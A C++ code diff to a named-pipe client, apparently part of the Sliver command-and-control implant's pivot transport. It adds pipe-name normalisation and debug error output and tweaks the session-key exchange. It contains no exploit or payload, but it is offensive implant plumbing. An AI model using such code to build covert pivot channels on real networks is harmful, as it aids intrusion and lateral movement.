@@ -3,11 +3,16 @@
 #include "pivots.h"
 #include "CryptoUtils.h"
 #include "constants.h"
+#include <regex>
 #define BUF_SIZE 32768
 using namespace std;
 
 namespace transports {
 	NamedPipeClient::NamedPipeClient(const string& _pipe_name) : pipe_name(_pipe_name) {
+		
+		//pipe_name = regex_replace(_pipe_name, std::regex("\\"), "/");
+		std::replace(pipe_name.begin(), pipe_name.end(), '/', '\\');
+		pipe_name = regex_replace(pipe_name, std::regex("namedpipe:"), "");
 		this->hPipeRead = INVALID_HANDLE_VALUE;
 		this->hPipeWrite = INVALID_HANDLE_VALUE;
 	}
@@ -30,8 +35,14 @@ namespace transports {
 			OPEN_EXISTING,
 			0,
 			NULL);
-		if (this->hPipeWrite == INVALID_HANDLE_VALUE)
+		if (this->hPipeWrite == INVALID_HANDLE_VALUE) {
+#ifdef DEBUG
+			int error = GetLastError();
+			std::cout << std::format("createfileA on {} failed with error: {}", tmp, error) << std::endl;
+#endif
 			return false;
+		}
+			
 		tmp = this->pipe_name;
 		this->hPipeRead = CreateFileA(
 			tmp.append("_writeserver").c_str(),             // pipe name 
@@ -42,8 +53,13 @@ namespace transports {
 			OPEN_EXISTING,
 			0,
 			NULL);
-		if (this->hPipeRead == INVALID_HANDLE_VALUE)
+		if (this->hPipeRead == INVALID_HANDLE_VALUE) {
+#ifdef DEBUG
+			int error = GetLastError();
+			std::cout << std::format("createfileA on {} failed with error: {}", tmp,error) << std::endl;
+#endif
 			return false;
+		}
 		DWORD dwMode = PIPE_READMODE_BYTE;
 		auto fSuccess = SetNamedPipeHandleState(
 			this->hPipeRead,    // pipe handle 
@@ -70,7 +86,7 @@ namespace transports {
 		//server key exchange
 		auto key = crypto::RandomKey();
 		this->server_ctx.SetKey(key);
-		auto enc = crypto::ECCEncryptToServer(key);
+		auto enc = crypto::ECCEncryptToServer(std::move(key));
 		sliverpb::PivotServerKeyExchange server_req;
 		server_req.set_sessionkey(enc);
 		server_req.set_originid(pivots::generatePeerID());
